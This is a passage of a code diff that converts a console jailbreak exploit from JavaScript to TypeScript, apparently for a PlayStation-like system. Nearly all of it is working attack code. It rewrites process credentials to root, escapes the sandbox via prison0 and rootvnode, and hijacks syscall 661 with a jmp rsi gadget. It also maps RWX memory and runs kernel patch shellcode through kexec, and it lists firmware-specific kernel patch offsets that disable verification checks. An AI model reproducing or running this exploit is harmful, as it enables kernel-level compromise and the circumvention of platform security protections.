-    (_kernel$write_buffer = kernel.write_buffer) === null || _kernel$write_buffer === void 0 || _kernel$write_buffer.call(kernel, dest, buf);
+  write_byte: function (dest: BigInt, value: number) {
+    const buf = new Uint8Array(1)
+    buf[0] = Number(value & 0xFF)
+    kernel.write_buffer?.(dest, buf)
   },
-  write_word: function (dest, value) {
-    var _kernel$write_buffer2;
-    var buf = new Uint8Array(2);
-    buf[0] = Number(value & 0xFF);
-    buf[1] = Number(value >> 8 & 0xFF);
-    (_kernel$write_buffer2 = kernel.write_buffer) === null || _kernel$write_buffer2 === void 0 || _kernel$write_buffer2.call(kernel, dest, buf);
+  write_word: function (dest: BigInt, value: number) {
+    const buf = new Uint8Array(2)
+    buf[0] = Number(value & 0xFF)
+    buf[1] = Number((value >> 8) & 0xFF)
+    kernel.write_buffer?.(dest, buf)
   },
-  write_dword: function (dest, value) {
-    var _kernel$write_buffer3;
-    var buf = new Uint8Array(4);
-    for (var i = 0; i < 4; i++) {
-      buf[i] = Number(value >> i * 8 & 0xFF);
+  write_dword: function (dest: BigInt, value: number) {
+    const buf = new Uint8Array(4)
+    for (let i = 0; i < 4; i++) {
+      buf[i] = Number((value >> (i * 8)) & 0xFF)
     }
-    (_kernel$write_buffer3 = kernel.write_buffer) === null || _kernel$write_buffer3 === void 0 || _kernel$write_buffer3.call(kernel, dest, buf);
+    kernel.write_buffer?.(dest, buf)
   },
-  write_qword: function (dest, value) {
-    var _kernel$write_buffer4;
-    var buf = new Uint8Array(8);
-    value = value instanceof BigInt ? value : new BigInt(value);
-    var val_hi = value.hi;
-    var val_low = value.lo;
-    for (var i = 0; i < 4; i++) {
-      buf[i]     = Number(val_low >> (i * 8)) & 0xFF;
-      buf[i + 4] = Number(val_hi  >> (i * 8)) & 0xFF;   // ? ?? ???????
+  write_qword: function (dest: BigInt, value: BigInt | number) {
+    const buf = new Uint8Array(8)
+    value = value instanceof BigInt ? value : new BigInt(value)
+
+    const val_hi = value.hi
+    const val_low = value.lo
+
+    for (let i = 0; i < 4; i++) {
+      buf[i] = Number((val_low >> (i * 8))) & 0xFF
+      buf[i + 4] = Number((val_hi >> ((i + 4) * 8))) & 0xFF
     }
-    (_kernel$write_buffer4 = kernel.write_buffer) === null || _kernel$write_buffer4 === void 0 || _kernel$write_buffer4.call(kernel, dest, buf);
+    kernel.write_buffer?.(dest, buf)
   }
-};
+}
 
 // Helper functions
-function is_kernel_rw_available() {
-  return kernel.read_buffer && kernel.write_buffer;
+export function is_kernel_rw_available () {
+  return kernel.read_buffer && kernel.write_buffer
 }
-function check_kernel_rw() {
-  if (!is_kernel_rw_available()) {
-    throw new Error('kernel r/w is not available');
-  }
-}
-function write8(addr, val) {
-  mem.view(addr).setUint8(0, val & 0xFF);
-}
-function write16(addr, val) {
-  mem.view(addr).setUint16(0, val & 0xFFFF, true);
-}
-function write32(addr, val) {
-  mem.view(addr).setUint32(0, val & 0xFFFFFFFF, true);
-}
-function write64(addr, val) {
-  mem.view(addr).setBigInt(0, new BigInt(val), true);
-}
-function read8(addr) {
-  return mem.view(addr).getUint8(0);
-}
-function read16(addr) {
-  return mem.view(addr).getUint16(0, true);
-}
-function read32(addr) {
-  return mem.view(addr).getUint32(0, true);
-}
-function read64(addr) {
-  return mem.view(addr).getBigInt(0, true);
-}
-function malloc(size) {
-  return mem.malloc(size);
-}
-function hex(val) {
-  if (val instanceof BigInt) {
-    return val.toString();
-  }
-  return '0x' + val.toString(16).padStart(2, '0');
-}
-function send_notification(msg) {
-  utils.notify(msg);
-}
-fn.register(0x0ca, 'sysctl', ['bigint', 'number', 'bigint', 'bigint', 'bigint', 'bigint'], 'bigint');
-var sysctl = fn.sysctl;
-function sysctlbyname(name, oldp, oldp_len, newp, newp_len) {
-  var translate_name_mib = malloc(0x8);
-  var buf_size = 0x70;
-  var mib = malloc(buf_size);
-  var size = malloc(0x8);
-  write64(translate_name_mib, new BigInt(0x3, 0x0));
-  write64(size, buf_size);
-  var name_addr = utils.cstr(name);
-  var name_len = new BigInt(name.length);
-  if (sysctl(translate_name_mib, 2, mib, size, name_addr, name_len).eq(new BigInt(0xffffffff, 0xffffffff))) {
-    log('failed to translate sysctl name to mib (' + name + ')');
-  }
-  oldp = typeof oldp === 'number' ? new BigInt(oldp) : oldp;
-  oldp_len = typeof oldp_len === 'number' ? new BigInt(oldp_len) : oldp_len;
-  newp = typeof newp === 'number' ? new BigInt(newp) : newp;
-  newp_len = typeof newp_len === 'number' ? new BigInt(newp_len) : newp_len;
-  if (sysctl(mib, 2, oldp, oldp_len, newp, newp_len).eq(new BigInt(0xffffffff, 0xffffffff))) {
-    return false;
-  }
-  return true;
-}
-function get_fwversion() {
-  var buf = malloc(0x8);
-  var size = malloc(0x8);
-  write64(size, 0x8);
-  if (sysctlbyname('kern.sdk_version', buf, size, 0, 0)) {
-    var byte1 = Number(read8(buf.add(2))); // Minor version (first byte)
-    var byte2 = Number(read8(buf.add(3))); // Major version (second byte)
 
-    var version = byte2.toString(16) + '.' + byte1.toString(16).padStart(2, '0');
-    return version;
+export function check_kernel_rw () {
+  if (!is_kernel_rw_available()) {
+    throw new Error('kernel r/w is not available')
   }
-  return null;
+}
+
+export function write8 (addr: BigInt, val: number) {
+  mem.view(addr).setUint8(0, val & 0xFF)
+}
+
+export function write16 (addr: BigInt, val: number) {
+  mem.view(addr).setUint16(0, val & 0xFFFF, true)
+}
+
+export function write32 (addr: BigInt, val: number) {
+  mem.view(addr).setUint32(0, val & 0xFFFFFFFF, true)
+}
+
+export function write64 (addr: BigInt, val: BigInt | number) {
+  mem.view(addr).setBigInt(0, new BigInt(val), true)
+}
+
+export function read8 (addr: BigInt) {
+  return mem.view(addr).getUint8(0)
+}
+
+export function read16 (addr: BigInt) {
+  return mem.view(addr).getUint16(0, true)
+}
+
+export function read32 (addr: BigInt) {
+  return mem.view(addr).getUint32(0, true)
+}
+
+export function read64 (addr: BigInt) {
+  return mem.view(addr).getBigInt(0, true)
+}
+
+export function malloc (size: number) {
+  return mem.malloc(size)
+}
+
+export function hex (val: BigInt | number) {
+  if (val instanceof BigInt) { return val.toString() }
+  return '0x' + val.toString(16).padStart(2, '0')
+}
+
+export function send_notification (msg: string) {
+  utils.notify(msg)
+}
+
+fn.register(0x0ca, 'sysctl', ['bigint', 'number', 'bigint', 'bigint', 'bigint', 'bigint'], 'bigint')
+const sysctl = fn.sysctl
+
+export function sysctlbyname (name: string, oldp: BigInt | number, oldp_len: BigInt | number, newp: BigInt | number, newp_len: BigInt | number) {
+  const translate_name_mib = malloc(0x8)
+  const buf_size = 0x70
+  const mib = malloc(buf_size)
+  const size = malloc(0x8)
+
+  write64(translate_name_mib, new BigInt(0x3, 0x0))
+  write64(size, buf_size)
+
+  const name_addr = utils.cstr(name)
+  const name_len = new BigInt(name.length)
+
+  if (sysctl(translate_name_mib, 2, mib, size, name_addr, name_len).eq(new BigInt(0xffffffff, 0xffffffff))) {
+    log('failed to translate sysctl name to mib (' + name + ')')
+  }
+
+  oldp = typeof oldp === 'number' ? new BigInt(oldp) : oldp
+  oldp_len = typeof oldp_len === 'number' ? new BigInt(oldp_len) : oldp_len
+  newp = typeof newp === 'number' ? new BigInt(newp) : newp
+  newp_len = typeof newp_len === 'number' ? new BigInt(newp_len) : newp_len
+
+  if (sysctl(mib, 2, oldp, oldp_len, newp, newp_len).eq(new BigInt(0xffffffff, 0xffffffff))) {
+    return false
+  }
+
+  return true
+}
+
+export function get_fwversion () {
+  const buf = malloc(0x8)
+  const size = malloc(0x8)
+  write64(size, 0x8)
+  if (sysctlbyname('kern.sdk_version', buf, size, 0, 0)) {
+    const byte1 = Number(read8(buf.add(2)))  // Minor version (first byte)
+    const byte2 = Number(read8(buf.add(3)))  // Major version (second byte)
+
+    const version = byte2.toString(16) + '.' + byte1.toString(16).padStart(2, '0')
+    return version
+  }
+
+  return null
 }
 
 // Before calling this function we need to initialize
@@ -662,407 +728,336 @@ function get_fwversion() {
 //      kernel.addr.allproc
 //      kernel.addr.base
 
-fn.register(0x18, 'getuid', [], 'bigint');
-fn.register(0x249, 'is_in_sandbox', [], 'bigint');
-fn.register(477, 'mmap', ['bigint', 'number', 'number', 'number', 'bigint', 'number'], 'bigint');
-fn.register(0x49, 'munmap', ['bigint', 'number'], 'bigint');
-var getuid = fn.getuid;
-var is_in_sandbox = fn.is_in_sandbox;
-var mmap = fn.mmap;
-var munmap = fn.munmap;
-function jailbreak_shared(FW_VERSION) {
+fn.register(0x18, 'getuid', [], 'bigint')
+fn.register(0x249, 'is_in_sandbox', [], 'bigint')
+fn.register(477, 'mmap', ['bigint', 'number', 'number', 'number', 'bigint', 'number'], 'bigint')
+fn.register(0x49, 'munmap', ['bigint', 'number'], 'bigint')
+const getuid = fn.getuid
+const is_in_sandbox = fn.is_in_sandbox
+const mmap = fn.mmap
+const munmap = fn.munmap
+
+export function jailbreak_shared (FW_VERSION: string) {
   if (!kernel.addr.curproc || !kernel.addr.base || !kernel.addr.allproc) {
-    throw new Error('kernel.addr is not properly initialized');
+    throw new Error('kernel.addr is not properly initialized')
   }
   if (!kernel_offset) {
-    throw new Error('kernel_offset is not initialized');
+    throw new Error('kernel_offset is not initialized')
   }
-  var OFFSET_P_UCRED = 0x40;
-  var proc = kernel.addr.curproc;
-  var uid_before = Number(getuid());
-  var sandbox_before = Number(is_in_sandbox());
-  debug('BEFORE: uid=' + uid_before + ', sandbox=' + sandbox_before);
+
+  const OFFSET_P_UCRED = 0x40
+  const proc = kernel.addr.curproc
+
+  const uid_before = Number(getuid())
+  const sandbox_before = Number(is_in_sandbox())
+  debug('BEFORE: uid=' + uid_before + ', sandbox=' + sandbox_before)
 
   // Patch ucred
-  var proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD));
-  var ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED));
+  const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD!))
+  const ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED))
+
   if (!proc_fd || !ucred) {
-    throw new Error('Failed to read proc_fd or ucred');
+    throw new Error('Failed to read proc_fd or ucred')
   }
-  kernel.write_dword(ucred.add(0x04), 0); // cr_uid
-  kernel.write_dword(ucred.add(0x08), 0); // cr_ruid
-  kernel.write_dword(ucred.add(0x0C), 0); // cr_svuid
-  kernel.write_dword(ucred.add(0x10), 1); // cr_ngroups
-  kernel.write_dword(ucred.add(0x14), 0); // cr_rgid
 
-  var prison0 = kernel.read_qword(kernel.addr.base.add(kernel_offset.PRISON0));
+  kernel.write_dword(ucred.add(0x04), 0)  // cr_uid
+  kernel.write_dword(ucred.add(0x08), 0)  // cr_ruid
+  kernel.write_dword(ucred.add(0x0C), 0)  // cr_svuid
+  kernel.write_dword(ucred.add(0x10), 1)  // cr_ngroups
+  kernel.write_dword(ucred.add(0x14), 0)  // cr_rgid
+
+  const prison0 = kernel.read_qword(kernel.addr.base.add(kernel_offset.PRISON0))
   if (!prison0) {
-    throw new Error('Failed to read prison0');
+    throw new Error('Failed to read prison0')
   }
-  kernel.write_qword(ucred.add(0x30), prison0);
-  kernel.write_qword(ucred.add(0x60), new BigInt(0xFFFFFFFF, 0xFFFFFFFF)); // sceCaps
-  kernel.write_qword(ucred.add(0x68), new BigInt(0xFFFFFFFF, 0xFFFFFFFF));
-  var rootvnode = kernel.read_qword(kernel.addr.base.add(kernel_offset.ROOTVNODE));
-  if (!rootvnode) {
-    throw new Error('Failed to read rootvnode');
-  }
-  kernel.write_qword(proc_fd.add(0x10), rootvnode); // fd_rdir
-  kernel.write_qword(proc_fd.add(0x18), rootvnode); // fd_jdir
+  kernel.write_qword(ucred.add(0x30), prison0)
 
-  var uid_after = Number(getuid());
-  var sandbox_after = Number(is_in_sandbox());
-  debug('AFTER:  uid=' + uid_after + ', sandbox=' + sandbox_after);
+  kernel.write_qword(ucred.add(0x60), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))  // sceCaps
+  kernel.write_qword(ucred.add(0x68), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))
+
+  const rootvnode = kernel.read_qword(kernel.addr.base.add(kernel_offset.ROOTVNODE))
+  if (!rootvnode) {
+    throw new Error('Failed to read rootvnode')
+  }
+  kernel.write_qword(proc_fd.add(0x10), rootvnode)  // fd_rdir
+  kernel.write_qword(proc_fd.add(0x18), rootvnode)  // fd_jdir
+
+  const uid_after = Number(getuid())
+  const sandbox_after = Number(is_in_sandbox())
+  debug('AFTER:  uid=' + uid_after + ', sandbox=' + sandbox_after)
+
   if (uid_after === 0 && sandbox_after === 0) {
-    debug('Sandbox escape complete!');
+    debug('Sandbox escape complete!')
   } else {
-    debug('[WARNING] Sandbox escape may have failed');
+    debug('[WARNING] Sandbox escape may have failed')
   }
 
   // === Apply kernel patches via kexec ===
   // Uses syscall_raw() which sets rax manually for syscalls without gadgets
-  debug('Applying kernel patches...');
-  var kpatch_result = apply_kernel_patches(FW_VERSION);
+  debug('Applying kernel patches...')
+  const kpatch_result = apply_kernel_patches(FW_VERSION)
   if (kpatch_result) {
-    debug('Kernel patches applied successfully!');
+    debug('Kernel patches applied successfully!')
 
     // Comprehensive kernel patch verification
-    debug('Verifying kernel patches...');
-    var all_patches_ok = true;
+    debug('Verifying kernel patches...')
+    let all_patches_ok = true
 
     // 1. Verify mmap RWX patch (0x33 -> 0x37 at two locations)
-    var mmap_offsets = get_mmap_patch_offsets(FW_VERSION);
+    const mmap_offsets = get_mmap_patch_offsets(FW_VERSION)
     if (mmap_offsets) {
-      var b1 = kernel.read_byte(kernel.addr.base.add(mmap_offsets[0]));
-      var b2 = kernel.read_byte(kernel.addr.base.add(mmap_offsets[1]));
+      const b1 = kernel.read_byte(kernel.addr.base.add(mmap_offsets[0]!))
+      const b2 = kernel.read_byte(kernel.addr.base.add(mmap_offsets[1]!))
       if (b1 === 0x37 && b2 === 0x37) {
-        debug('  [OK] mmap RWX patch');
+        debug('  [OK] mmap RWX patch')
       } else {
-        debug('  [FAIL] mmap RWX: [' + hex(mmap_offsets[0]) + ']=' + hex(b1 !== null && b1 !== void 0 ? b1 : 0) + ' [' + hex(mmap_offsets[1]) + ']=' + hex(b2 !== null && b2 !== void 0 ? b2 : 0));
-        all_patches_ok = false;
+        debug('  [FAIL] mmap RWX: [' + hex(mmap_offsets[0]!) + ']=' + hex(b1 ?? 0) + ' [' + hex(mmap_offsets[1]!) + ']=' + hex(b2 ?? 0))
+        all_patches_ok = false
       }
     } else {
-      debug('  [SKIP] mmap RWX (no offsets for FW ' + FW_VERSION + ')');
+      debug('  [SKIP] mmap RWX (no offsets for FW ' + FW_VERSION + ')')
     }
 
     // 2. Test mmap RWX actually works by trying to allocate RWX memory
     try {
-      var PROT_RWX = 0x7; // READ | WRITE | EXEC
-      var MAP_ANON = 0x1000;
-      var MAP_PRIVATE = 0x2;
-      var test_addr = mmap(new BigInt(0), 0x1000, PROT_RWX, MAP_PRIVATE | MAP_ANON, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0);
+      const PROT_RWX = 0x7  // READ | WRITE | EXEC
+      const MAP_ANON = 0x1000
+      const MAP_PRIVATE = 0x2
+      const test_addr = mmap(new BigInt(0), 0x1000, PROT_RWX, MAP_PRIVATE | MAP_ANON, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0)
       if (Number(test_addr.shr(32)) < 0xffff8000) {
-        debug('  [OK] mmap RWX functional @ ' + hex(test_addr));
+        debug('  [OK] mmap RWX functional @ ' + hex(test_addr))
         // Unmap the test allocation
-        munmap(test_addr, 0x1000);
+        munmap(test_addr, 0x1000)
       } else {
-        debug('  [FAIL] mmap RWX functional: ' + hex(test_addr));
-        all_patches_ok = false;
+        debug('  [FAIL] mmap RWX functional: ' + hex(test_addr))
+        all_patches_ok = false
       }
     } catch (e) {
-      debug('  [FAIL] mmap RWX test error: ' + e.message);
-      all_patches_ok = false;
+      debug('  [FAIL] mmap RWX test error: ' + (e as Error).message)
+      all_patches_ok = false
     }
+
     if (all_patches_ok) {
-      debug('All kernel patches verified OK!');
+      debug('All kernel patches verified OK!')
     } else {
-      debug('[WARNING] Some kernel patches may have failed');
+      debug('[WARNING] Some kernel patches may have failed')
     }
   } else {
-    debug('[WARNING] Kernel patches failed - continuing without patches');
+    debug('[WARNING] Kernel patches failed - continuing without patches')
   }
 }
-fn.register(0x215, 'jitshm_create', ['number', 'number', 'number'], 'bigint');
-fn.register(0x295, 'kexec', ['bigint'], 'bigint');
-var jitshm_create = fn.jitshm_create;
-var kexec = fn.kexec;
+
+fn.register(0x215, 'jitshm_create', ['number', 'number', 'number'], 'bigint')
+fn.register(0x295, 'kexec', ['bigint'], 'bigint')
+const jitshm_create = fn.jitshm_create
+const kexec = fn.kexec
 
 // Apply kernel patches via kexec using a single ROP chain
 // This avoids returning to JS between critical operations
-function apply_kernel_patches(fw_version) {
+export function apply_kernel_patches (fw_version: string) {
   try {
     if (!kernel.addr.base) {
-      throw new Error('kernel.addr.base is not initialized');
+      throw new Error('kernel.addr.base is not initialized')
     }
     if (!kernel_offset) {
-      throw new Error('kernel_offset is not initialized');
+      throw new Error('kernel_offset is not initialized')
     }
     // Get shellcode for this firmware
-    var shellcode = get_kpatch_shellcode(fw_version);
+    const shellcode = get_kpatch_shellcode(fw_version)
     if (!shellcode) {
-      debug('No kernel patch shellcode for FW ' + fw_version);
-      return false;
+      debug('No kernel patch shellcode for FW ' + fw_version)
+      return false
     }
-    debug('Kernel patch shellcode: ' + shellcode.length + ' bytes');
+
+    debug('Kernel patch shellcode: ' + shellcode.length + ' bytes')
 
     // Constants
-    var PROT_READ = 0x1;
-    var PROT_WRITE = 0x2;
-    var PROT_EXEC = 0x4;
-    var PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;
-    var mapping_addr = new BigInt(0x9, 0x26100000); // Different from 0x920100000 to avoid conflicts
-    var aligned_memsz = 0x10000;
+    const PROT_READ = 0x1
+    const PROT_WRITE = 0x2
+    const PROT_EXEC = 0x4
+    const PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC
+
+    const mapping_addr = new BigInt(0x9, 0x26100000)  // Different from 0x920100000 to avoid conflicts
+    const aligned_memsz = 0x10000
 
     // Get sysent[661] address and save original values
-    var sysent_661_addr = kernel.addr.base.add(kernel_offset.SYSENT_661);
-    debug('sysent[661] @ ' + hex(sysent_661_addr));
-    var sy_narg = kernel.read_dword(sysent_661_addr);
-    var sy_call = kernel.read_qword(sysent_661_addr.add(8));
-    var sy_thrcnt = kernel.read_dword(sysent_661_addr.add(0x2C));
-    debug('Original sy_narg: ' + hex(sy_narg !== null && sy_narg !== void 0 ? sy_narg : 0));
-    debug('Original sy_call: ' + hex(sy_call !== null && sy_call !== void 0 ? sy_call : 0));
-    debug('Original sy_thrcnt: ' + hex(sy_thrcnt !== null && sy_thrcnt !== void 0 ? sy_thrcnt : 0));
+    const sysent_661_addr = kernel.addr.base.add(kernel_offset.SYSENT_661)
+    debug('sysent[661] @ ' + hex(sysent_661_addr))
+
+    const sy_narg = kernel.read_dword(sysent_661_addr)
+    const sy_call = kernel.read_qword(sysent_661_addr.add(8))
+    const sy_thrcnt = kernel.read_dword(sysent_661_addr.add(0x2C))
+
+    debug('Original sy_narg: ' + hex(sy_narg ?? 0))
+    debug('Original sy_call: ' + hex(sy_call ?? 0))
+    debug('Original sy_thrcnt: ' + hex(sy_thrcnt ?? 0))
+
     if (!sy_narg || !sy_call || !sy_thrcnt) {
-      debug('ERROR: Failed to read original sysent[661] values');
-      return false;
+      debug('ERROR: Failed to read original sysent[661] values')
+      return false
     }
 
     // Calculate jmp rsi gadget address
-    var jmp_rsi_gadget = kernel.addr.base.add(kernel_offset.JMP_RSI_GADGET);
-    debug('jmp rsi gadget @ ' + hex(jmp_rsi_gadget));
+    const jmp_rsi_gadget = kernel.addr.base.add(kernel_offset.JMP_RSI_GADGET)
+    debug('jmp rsi gadget @ ' + hex(jmp_rsi_gadget))
 
     // Allocate buffer for shellcode in userspace first
-    var shellcode_buf = malloc(shellcode.length + 0x100);
-    debug('Shellcode buffer @ ' + hex(shellcode_buf));
+    const shellcode_buf = malloc(shellcode.length + 0x100)
+    debug('Shellcode buffer @ ' + hex(shellcode_buf))
 
     // Copy shellcode to userspace buffer
-    for (var i = 0; i < shellcode.length; i++) {
-      write8(shellcode_buf.add(i), shellcode[i]);
+    for (let i = 0; i < shellcode.length; i++) {
+      write8(shellcode_buf.add(i), shellcode[i]!)
     }
 
     // Verify first bytes
-    var first_bytes = read32(shellcode_buf);
-    debug('First bytes @ shellcode: ' + hex(first_bytes));
+    const first_bytes = read32(shellcode_buf)
+    debug('First bytes @ shellcode: ' + hex(first_bytes))
 
     // Hijack sysent[661] to point to jmp rsi gadget
-    debug('Hijacking sysent[661]...');
-    kernel.write_dword(sysent_661_addr, 2); // sy_narg = 2
-    kernel.write_qword(sysent_661_addr.add(8), jmp_rsi_gadget); // sy_call = jmp rsi
-    kernel.write_dword(sysent_661_addr.add(0x2C), 1); // sy_thrcnt = 1
-    debug('Hijacked sysent[661]');
+    debug('Hijacking sysent[661]...')
+    kernel.write_dword(sysent_661_addr, 2)                      // sy_narg = 2
+    kernel.write_qword(sysent_661_addr.add(8), jmp_rsi_gadget)  // sy_call = jmp rsi
+    kernel.write_dword(sysent_661_addr.add(0x2C), 1)            // sy_thrcnt = 1
+    debug('Hijacked sysent[661]')
 
     // Check if jitshm_create has a dedicated gadget
-    var jitshm_num = 0x215; // SYSCALL.jitshm_create = 0x215n;     // 533
-    var jitshm_gadget = syscalls.map.get(jitshm_num);
-    debug('jitshm_create gadget: ' + (jitshm_gadget ? hex(jitshm_gadget) : 'NOT FOUND'));
+    const jitshm_num = 0x215 // SYSCALL.jitshm_create = 0x215n;     // 533
+    const jitshm_gadget = syscalls.map.get(jitshm_num)
+    debug('jitshm_create gadget: ' + (jitshm_gadget ? hex(jitshm_gadget) : 'NOT FOUND'))
 
     // Try using the standard syscall() function if gadget exists
     if (!jitshm_gadget) {
-      debug('ERROR: jitshm_create gadget not found in libkernel');
-      debug('Kernel patches require jitshm_create syscall support');
-      return false;
+      debug('ERROR: jitshm_create gadget not found in libkernel')
+      debug('Kernel patches require jitshm_create syscall support')
+      return false
     }
 
     // 1. jitshm_create(0, aligned_memsz, PROT_RWX)
-    debug('Calling jitshm_create...');
-    var exec_handle = jitshm_create(0, aligned_memsz, PROT_RWX);
-    debug('jitshm_create handle: ' + hex(exec_handle));
+    debug('Calling jitshm_create...')
+
+    const exec_handle = jitshm_create(0, aligned_memsz, PROT_RWX)
+    debug('jitshm_create handle: ' + hex(exec_handle))
+
     if (Number(exec_handle.shr(32)) >= 0xffff8000) {
-      debug('ERROR: jitshm_create failed');
-      kernel.write_dword(sysent_661_addr, sy_narg);
-      kernel.write_qword(sysent_661_addr.add(8), sy_call);
-      kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt);
-      return false;
+      debug('ERROR: jitshm_create failed')
+      kernel.write_dword(sysent_661_addr, sy_narg)
+      kernel.write_qword(sysent_661_addr.add(8), sy_call)
+      kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt)
+      return false
     }
 
     // 2. mmap(mapping_addr, aligned_memsz, PROT_RWX, MAP_SHARED|MAP_FIXED, exec_handle, 0)
-    debug('Calling mmap...');
-    var mmap_result = mmap(mapping_addr, aligned_memsz, PROT_RWX, 0x11, exec_handle, 0);
-    debug('mmap result: ' + hex(mmap_result));
+    debug('Calling mmap...')
+
+    const mmap_result = mmap(mapping_addr, aligned_memsz, PROT_RWX, 0x11, exec_handle, 0)
+    debug('mmap result: ' + hex(mmap_result))
+
     if (Number(mmap_result.shr(32)) >= 0xffff8000) {
-      debug('ERROR: mmap failed');
-      kernel.write_dword(sysent_661_addr, sy_narg);
-      kernel.write_qword(sysent_661_addr.add(8), sy_call);
-      kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt);
-      return false;
+      debug('ERROR: mmap failed')
+      kernel.write_dword(sysent_661_addr, sy_narg)
+      kernel.write_qword(sysent_661_addr.add(8), sy_call)
+      kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt)
+      return false
     }
 
     // 3. Copy shellcode to mapped memory
-    debug('Copying shellcode to ' + hex(mapping_addr) + '...');
-    for (var j = 0; j < shellcode.length; j++) {
-      write8(mapping_addr.add(j), shellcode[j]);
+    debug('Copying shellcode to ' + hex(mapping_addr) + '...')
+    for (let j = 0; j < shellcode.length; j++) {
+      write8(mapping_addr.add(j), shellcode[j]!)
     }
 
     // Verify
-    var verify_bytes = read32(mapping_addr);
-    debug('First bytes @ mapped: ' + hex(verify_bytes));
+    const verify_bytes = read32(mapping_addr)
+    debug('First bytes @ mapped: ' + hex(verify_bytes))
 
     // 4. kexec(mapping_addr) - syscall 661, hijacked to jmp rsi
-    debug('Calling kexec...');
-    var kexec_result = kexec(mapping_addr);
-    debug('kexec returned: ' + hex(kexec_result));
+    debug('Calling kexec...')
+
+    const kexec_result = kexec(mapping_addr)
+    debug('kexec returned: ' + hex(kexec_result))
 
     // === Verify 12.00 kernel patches ===
     if (fw_version === '12.00' || fw_version === '12.02') {
-      debug('Verifying 12.00 kernel patches...');
-      var patch_errors = 0;
+      debug('Verifying 12.00 kernel patches...')
+      let patch_errors = 0
 
       // Patch offsets and expected values for 12.00
-      var patches_to_verify = [{
-        off: 0x1b76a3,
-        exp: 0x04eb,
-        name: 'dlsym_check1',
-        size: 2
-      }, {
-        off: 0x1b76b3,
-        exp: 0x04eb,
-        name: 'dlsym_check2',
-        size: 2
-      }, {
-        off: 0x1b76d3,
-        exp: 0xe990,
-        name: 'dlsym_check3',
-        size: 2
-      }, {
-        off: 0x627af4,
-        exp: 0x00eb,
-        name: 'veriPatch',
-        size: 2
-      }, {
-        off: 0xacd,
-        exp: 0xeb,
-        name: 'bcopy',
-        size: 1
-      }, {
-        off: 0x2bd3cd,
-        exp: 0xeb,
-        name: 'bzero',
-        size: 1
-      }, {
-        off: 0x2bd411,
-        exp: 0xeb,
-        name: 'pagezero',
-        size: 1
-      }, {
-        off: 0x2bd48d,
-        exp: 0xeb,
-        name: 'memcpy',
-        size: 1
-      }, {
-        off: 0x2bd4d1,
-        exp: 0xeb,
-        name: 'pagecopy',
-        size: 1
-      }, {
-        off: 0x2bd67d,
-        exp: 0xeb,
-        name: 'copyin',
-        size: 1
-      }, {
-        off: 0x2bdb2d,
-        exp: 0xeb,
-        name: 'copyinstr',
-        size: 1
-      }, {
-        off: 0x2bdbfd,
-        exp: 0xeb,
-        name: 'copystr',
-        size: 1
-      }, {
-        off: 0x6283df,
-        exp: 0x00eb,
-        name: 'sysVeri_suspend',
-        size: 2
-      }, {
-        off: 0x490,
-        exp: 0x00,
-        name: 'syscall_check',
-        size: 4
-      }, {
-        off: 0x4c2,
-        exp: 0xeb,
-        name: 'syscall_jmp1',
-        size: 1
-      }, {
-        off: 0x4b9,
-        exp: 0x00eb,
-        name: 'syscall_jmp2',
-        size: 2
-      }, {
-        off: 0x4b5,
-        exp: 0x00eb,
-        name: 'syscall_jmp3',
-        size: 2
-      }, {
-        off: 0x3914e6,
-        exp: 0xeb,
-        name: 'setuid',
-        size: 1
-      }, {
-        off: 0x2fc0ec,
-        exp: 0x04eb,
-        name: 'vm_map_protect',
-        size: 2
-      }, {
-        off: 0x1b7164,
-        exp: 0xe990,
-        name: 'dynlib_load_prx',
-        size: 2
-      }, {
-        off: 0x1fa71a,
-        exp: 0x37,
-        name: 'mmap_rwx1',
-        size: 1
-      }, {
-        off: 0x1fa71d,
-        exp: 0x37,
-        name: 'mmap_rwx2',
-        size: 1
-      }, {
-        off: 0x1102d80,
-        exp: 0x02,
-        name: 'sysent11_narg',
-        size: 4
-      }, {
-        off: 0x1102dac,
-        exp: 0x01,
-        name: 'sysent11_thrcnt',
-        size: 4
-      }];
-      for (var p of patches_to_verify) {
-        var actual = void 0;
+      const patches_to_verify = [
+        { off: 0x1b76a3, exp: 0x04eb, name: 'dlsym_check1', size: 2 },
+        { off: 0x1b76b3, exp: 0x04eb, name: 'dlsym_check2', size: 2 },
+        { off: 0x1b76d3, exp: 0xe990, name: 'dlsym_check3', size: 2 },
+        { off: 0x627af4, exp: 0x00eb, name: 'veriPatch', size: 2 },
+        { off: 0xacd, exp: 0xeb, name: 'bcopy', size: 1 },
+        { off: 0x2bd3cd, exp: 0xeb, name: 'bzero', size: 1 },
+        { off: 0x2bd411, exp: 0xeb, name: 'pagezero', size: 1 },
+        { off: 0x2bd48d, exp: 0xeb, name: 'memcpy', size: 1 },
+        { off: 0x2bd4d1, exp: 0xeb, name: 'pagecopy', size: 1 },
+        { off: 0x2bd67d, exp: 0xeb, name: 'copyin', size: 1 },
+        { off: 0x2bdb2d, exp: 0xeb, name: 'copyinstr', size: 1 },
+        { off: 0x2bdbfd, exp: 0xeb, name: 'copystr', size: 1 },
+        { off: 0x6283df, exp: 0x00eb, name: 'sysVeri_suspend', size: 2 },
+        { off: 0x490, exp: 0x00, name: 'syscall_check', size: 4 },
+        { off: 0x4c2, exp: 0xeb, name: 'syscall_jmp1', size: 1 },
+        { off: 0x4b9, exp: 0x00eb, name: 'syscall_jmp2', size: 2 },
+        { off: 0x4b5, exp: 0x00eb, name: 'syscall_jmp3', size: 2 },
+        { off: 0x3914e6, exp: 0xeb, name: 'setuid', size: 1 },
+        { off: 0x2fc0ec, exp: 0x04eb, name: 'vm_map_protect', size: 2 },
+        { off: 0x1b7164, exp: 0xe990, name: 'dynlib_load_prx', size: 2 },
+        { off: 0x1fa71a, exp: 0x37, name: 'mmap_rwx1', size: 1 },
+        { off: 0x1fa71d, exp: 0x37, name: 'mmap_rwx2', size: 1 },
